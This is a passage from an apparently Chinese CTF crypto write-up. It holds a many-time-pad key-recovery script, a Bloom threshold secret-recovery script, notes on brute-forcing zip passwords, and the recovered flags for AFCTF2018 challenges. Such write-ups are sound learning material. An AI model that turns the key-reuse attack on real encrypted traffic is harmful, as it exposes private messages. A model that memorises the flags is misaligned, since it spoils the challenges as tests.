string">'06140611460c26243c7f5c167f3d015446010053005907145d'</span>c11 <span class="token operator">=</span> <span class="token string">'0f05110d160f263f3a7f4210372c03111313090415481d49'</span>ciphers <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4<span class="token punctuation">,</span> c5<span class="token punctuation">,</span> c6<span class="token punctuation">,</span> c7<span class="token punctuation">,</span> c8<span class="token punctuation">,</span> c9<span class="token punctuation">,</span> c10<span class="token punctuation">,</span> c11<span class="token punctuation">]</span><span class="token comment"># The target ciphertext we want to crack</span><span class="token comment"># target_cipher = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"</span><span class="token comment"># XORs two string</span><span class="token keyword">def</span> <span class="token function">strxor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># xor two strings (trims the longer input)</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">target_fix</span><span class="token punctuation">(</span>target_cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># To store the final key</span>    final_key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">150</span>    <span class="token comment"># To store the positions we know are broken</span>    known_key_positions <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># For each ciphertext</span>    <span class="token keyword">for</span> current_index<span class="token punctuation">,</span> ciphertext <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>        counter <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># for each other ciphertext</span>        <span class="token keyword">for</span> index<span class="token punctuation">,</span> ciphertext2 <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> current_index <span class="token operator">!=</span> index<span class="token punctuation">:</span>  <span class="token comment"># don't xor a ciphertext with itself</span>                <span class="token keyword">for</span> indexOfChar<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>                        strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ciphertext2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Xor the two ciphertexts</span>                    <span class="token comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span>                    <span class="token keyword">if</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable <span class="token keyword">and</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> counter<span class="token punctuation">[</span>                        indexOfChar<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># Increment the counter at this index</span>        knownSpaceIndexes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># Loop through all positions where a space character was possible in the current_index cipher</span>        <span class="token keyword">for</span> ind<span class="token punctuation">,</span> val <span class="token keyword">in</span> counter<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span>            <span class="token keyword">if</span> val <span class="token operator">>=</span> <span class="token number">7</span><span class="token punctuation">:</span> knownSpaceIndexes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ind<span class="token punctuation">)</span>        <span class="token comment"># print knownSpaceIndexes # Shows all the positions where we now know the key!</span>        <span class="token comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span>        xor_with_spaces <span class="token operator">=</span> strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span> <span class="token operator">*</span> <span class="token number">150</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> index <span class="token keyword">in</span> knownSpaceIndexes<span class="token punctuation">:</span>            <span class="token comment"># Store the key's value at the correct position</span>            final_key<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> xor_with_spaces<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>            <span class="token comment"># Record that we known the key at this position</span>            known_key_positions<span class="token punctuation">.</span>add<span class="token punctuation">(</span>index<span class="token punctuation">)</span>    <span class="token comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span>    final_key_hex <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>val <span class="token keyword">if</span> val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'00'</span> <span class="token keyword">for</span> val <span class="token keyword">in</span> final_key<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># Xor the currently known key with the target cipher</span>    output <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> final_key_hex<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Fix this sentence:"</span>    <span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>char <span class="token keyword">if</span> index <span class="token keyword">in</span> known_key_positions <span class="token keyword">else</span> <span class="token string">'*'</span> <span class="token keyword">for</span> index<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"n"</span>    <span class="token comment"># WAIT.. MANUAL STEP HERE</span>    <span class="token comment"># This output are printing a * if that character is not known yet</span>    <span class="token comment"># fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a"</span>    <span class="token comment"># if is too hard, change the target_cipher to another one and try again</span>    <span class="token comment"># and we have our key to fix the entire text!</span>    <span class="token comment"># sys.exit(0) #comment and continue if u got a good key</span>    target_plaintext <span class="token operator">=</span> <span class="token string">"cure, Let Me know if you a"</span>    <span class="token keyword">print</span> <span class="token string">"Fixed:"</span>    <span class="token keyword">print</span> target_plaintext <span class="token operator">+</span> <span class="token string">"n"</span>    key <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target_plaintext<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Decrypted msg:"</span>    <span class="token keyword">for</span> cipher <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>        <span class="token keyword">print</span> strxor<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"nPrivate key recovered: "</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">"n"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>    target_fix<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="AFCTF2018-你听过一次一密么"><a href="#AFCTF2018-你听过一次一密么" class="headerlink" title="[AFCTF2018]你听过一次一密么?"></a>[AFCTF2018]你听过一次一密么?</h4><p>将上面的脚本稍作修改，既数据修改一下即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span><span class="token comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span><span class="token keyword">import</span> string<span class="token keyword">import</span> collections<span class="token keyword">import</span> sets<span class="token punctuation">,</span> sys<span class="token comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span>c1 <span class="token operator">=</span> <span class="token string">'25030206463d3d393131555f7f1d061d4052111a19544e2e5d'</span>c2 <span class="token operator">=</span> <span class="token string">'0f020606150f203f307f5c0a7f24070747130e16545000035d'</span>c3 <span class="token operator">=</span> <span class="token string">'1203075429152a7020365c167f390f1013170b1006481e1314'</span>c4 <span class="token operator">=</span> <span class="token string">'0f4610170e1e2235787f7853372c0f065752111b15454e0e09'</span>c5 <span class="token operator">=</span> <span class="token string">'081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18'</span>c6 <span class="token operator">=</span> <span class="token string">'0909075412132e247436425332281a1c561f04071d520f0b11'</span>c7 <span class="token operator">=</span> <span class="token string">'4116111b101e2170203011113a69001b475206011552050219'</span>c8 <span class="token operator">=</span> <span class="token string">'041006064612297020375453342c17545a01451811411a470e'</span>c9 <span class="token operator">=</span> <span class="token string">'021311114a5b0335207f7c167f22001b44520c15544801125d'</span>c10 <span class="token operator">=</span> <span class="token string">'06140611460c26243c7f5c167f3d015446010053005907145d'</span>c11 <span class="token operator">=</span> <span class="token string">'0f05110d160f263f3a7f4210372c03111313090415481d49'</span>ciphers <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4<span class="token punctuation">,</span> c5<span class="token punctuation">,</span> c6<span class="token punctuation">,</span> c7<span class="token punctuation">,</span> c8<span class="token punctuation">,</span> c9<span class="token punctuation">,</span> c10<span class="token punctuation">,</span> c11<span class="token punctuation">]</span><span class="token comment"># The target ciphertext we want to crack</span><span class="token comment"># target_cipher = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"</span><span class="token comment"># XORs two string</span><span class="token keyword">def</span> <span class="token function">strxor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># xor two strings (trims the longer input)</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">target_fix</span><span class="token punctuation">(</span>target_cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># To store the final key</span>    final_key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">150</span>    <span class="token comment"># To store the positions we know are broken</span>    known_key_positions <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># For each ciphertext</span>    <span class="token keyword">for</span> current_index<span class="token punctuation">,</span> ciphertext <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>        counter <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># for each other ciphertext</span>        <span class="token keyword">for</span> index<span class="token punctuation">,</span> ciphertext2 <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> current_index <span class="token operator">!=</span> index<span class="token punctuation">:</span>  <span class="token comment"># don't xor a ciphertext with itself</span>                <span class="token keyword">for</span> indexOfChar<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>                        strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ciphertext2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Xor the two ciphertexts</span>                    <span class="token comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span>                    <span class="token keyword">if</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable <span class="token keyword">and</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> counter<span class="token punctuation">[</span>                        indexOfChar<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># Increment the counter at this index</span>        knownSpaceIndexes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># Loop through all positions where a space character was possible in the current_index cipher</span>        <span class="token keyword">for</span> ind<span class="token punctuation">,</span> val <span class="token keyword">in</span> counter<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span>            <span class="token keyword">if</span> val <span class="token operator">>=</span> <span class="token number">7</span><span class="token punctuation">:</span> knownSpaceIndexes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ind<span class="token punctuation">)</span>        <span class="token comment"># print knownSpaceIndexes # Shows all the positions where we now know the key!</span>        <span class="token comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span>        xor_with_spaces <span class="token operator">=</span> strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span> <span class="token operator">*</span> <span class="token number">150</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> index <span class="token keyword">in</span> knownSpaceIndexes<span class="token punctuation">:</span>            <span class="token comment"># Store the key's value at the correct position</span>            final_key<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> xor_with_spaces<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>            <span class="token comment"># Record that we known the key at this position</span>            known_key_positions<span class="token punctuation">.</span>add<span class="token punctuation">(</span>index<span class="token punctuation">)</span>    <span class="token comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span>    final_key_hex <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>val <span class="token keyword">if</span> val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'00'</span> <span class="token keyword">for</span> val <span class="token keyword">in</span> final_key<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># Xor the currently known key with the target cipher</span>    output <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> final_key_hex<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Fix this sentence:"</span>    <span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>char <span class="token keyword">if</span> index <span class="token keyword">in</span> known_key_positions <span class="token keyword">else</span> <span class="token string">'*'</span> <span class="token keyword">for</span> index<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"n"</span>    <span class="token comment"># WAIT.. MANUAL STEP HERE</span>    <span class="token comment"># This output are printing a * if that character is not known yet</span>    <span class="token comment"># fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a"</span>    <span class="token comment"># if is too hard, change the target_cipher to another one and try again</span>    <span class="token comment"># and we have our key to fix the entire text!</span>    <span class="token comment"># sys.exit(0) #comment and continue if u got a good key</span>    target_plaintext <span class="token operator">=</span> <span class="token string">"ever if the key is kept s"</span>    <span class="token keyword">print</span> <span class="token string">"Fixed:"</span>    <span class="token keyword">print</span> target_plaintext <span class="token operator">+</span> <span class="token string">"n"</span>    key <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target_plaintext<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Decrypted msg:"</span>    <span class="token keyword">for</span> cipher <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>        <span class="token keyword">print</span> strxor<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"nPrivate key recovered: "</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">"n"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>    target_fix<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">nPrivate key recovered: afctf&#123;OPT_1s_Int3rest1ng&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="密码混合"><a href="#密码混合" class="headerlink" title="密码混合"></a>密码混合</h2><blockquote><p>有些密码题目太融合了，看起来既不像是古典，又不想是现代，还有些misc的成分在其中，就将其分入此类之中，这一类的题目直接以三级标题命名。</p></blockquote><h3 id="AFCTF2018-花开藏宝地"><a href="#AFCTF2018-花开藏宝地" class="headerlink" title="[AFCTF2018]花开藏宝地"></a>[AFCTF2018]花开藏宝地</h3><p>给出了5个压缩包，应该是每个压缩包对应的都是一种知识点。</p><h4 id="Secret1"><a href="#Secret1" class="headerlink" title="Secret1"></a>Secret1</h4><p>直接对压缩包进行爆破，看起来这一关有些misc的成分混杂于其中了。key是<code>19260817</code></p><p><img src="/2021/05/28/CTF/image-20210729163233973.png" style="zoom:67%;"></p><h4 id="Secret2"><a href="#Secret2" class="headerlink" title="Secret2"></a>Secret2</h4><p>提示是人名，然后就是大小写字母喽，直接再爆破得key2:<code>alice</code></p><p><img src="/2021/05/28/CTF/image-20210729164351421.png" style="zoom: 67%;"></p><h4 id="Secret4"><a href="#Secret4" class="headerlink" title="Secret4"></a>Secret4</h4><p>zip伪加密，修改一下标志位即可。</p><h4 id="Bloom门限方案"><a href="#Bloom门限方案" class="headerlink" title="Bloom门限方案"></a>Bloom门限方案</h4><p><a href="https://webencrypt.org/secretsharing/#bloom">Bloom门限参考链接</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a1 <span class="token operator">=</span><span class="token number">100459779913520540098065407420629954816677926423356769524759072632219106155849450125185205557491138357760494272691949199099803239098119602186117878931534968435982565071570831032814288620974807498206233914826253433847572703407678712965098320122549759579566316372220959610814573945698083909575005303253205653244238542300266460559790606278310650849881421791081944960157781855164700773081375247</span>d1 <span class="token operator">=</span><span class="token number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820820091</span>a2 <span class="token operator">=</span><span class="token number">305345133911395218573790903508296238659147802274031796643017539011648802808763162902335644195648525375518941848430114497150082025133000033835083076541927530829557051524161069423494451667848236452337271862085346869364976989047180532167560796470067549915390773271207901537847213882479997325575278672917648417868759077150999044891099206133296336190476413164240995177077671480352739572539631359</span>d2 <span class="token operator">=</span><span class="token number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413</span>a3 <span class="token operator">=</span> <span class="token number">152012681270682340051690627924586232702552460810030322267827401771304907469802591861912921281833890613186317787813611372838066924894691892444503039545946728621696590087591246339208248647926966446848123290344911662916758039134817404720512465817867255277476717353439505243247568126193361558042940352204093381260402400739429050280526212446967632582771424597203000629197487733610187359662268583</span>d3 <span class="token operator">=</span><span class="token number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553</span>dd <span class="token operator">=</span> d1<span class="token operator">*</span>d2<span class="token operator">*</span>d3t1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>dd<span class="token operator">//</span>d1<span class="token punctuation">,</span>d1<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span>d1<span class="token punctuation">)</span><span class="token keyword">assert</span><span class="token punctuation">(</span>t1<span class="token operator">*</span>d2<span class="token operator">*</span>d3<span class="token operator">%</span>d1 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>t2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>dd<span class="token operator">//</span>d2<span class="token punctuation">,</span>d2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span>d2<span class="token punctuation">)</span><span class="token keyword">assert</span><span class="token punctuation">(</span>t2<span class="token operator">*</span>d1<span class="token operator">*</span>d3<span class="token operator">%</span>d2 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>t3 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>dd<span class="token operator">//</span>d3<span class="token punctuation">,</span>d3<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span>d3<span class="token punctuation">)</span><span class="token keyword">assert</span><span class="token punctuation">(</span>t3<span class="token operator">*</span>d2<span class="token operator">*</span>d1<span class="token operator">%</span>d3 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>s <span class="token operator">=</span> a1<span class="token operator">*</span>t1<span class="token operator">*</span>d2<span class="token operator">*</span>d3<span class="token operator">+</span>a2<span class="token operator">*</span>t2<span class="token operator">*</span>d1<span class="token operator">*</span>d3<span class="token operator">+</span>a3<span class="token operator">*</span>t3<span class="token operator">*</span>d1<span class="token operator">*</span>d2p <span class="token operator">=</span> <span class="token number">80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857</span>s <span class="token operator">%=</span> dd<span class="token comment"># print(hex(s))</span>s <span class="token operator">%=</span> ps <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment"># A treasure map is a map that marks the location of buried treasure, a lost mine, a valuable secret or a hidden locale. So flag is afctf&#123;1sn't_s0_int3Resting&#125;.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="http://www.matrix67.com/blog/archives/1261">参考链接</a></p><h4 id="BJDCTF2020-伏羲六十四卦"><a href="#BJDCTF2020-伏羲六十四卦" class="headerlink" title="[BJDCTF2020]伏羲六十四卦"></a>[BJDCTF2020]伏羲六十四卦</h4><p>给出的附件有个什么六十四卦的编码，我一看就懵逼了，这又是什么古怪的编码？官方wp给出的解码脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有'</span>mydisc<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token 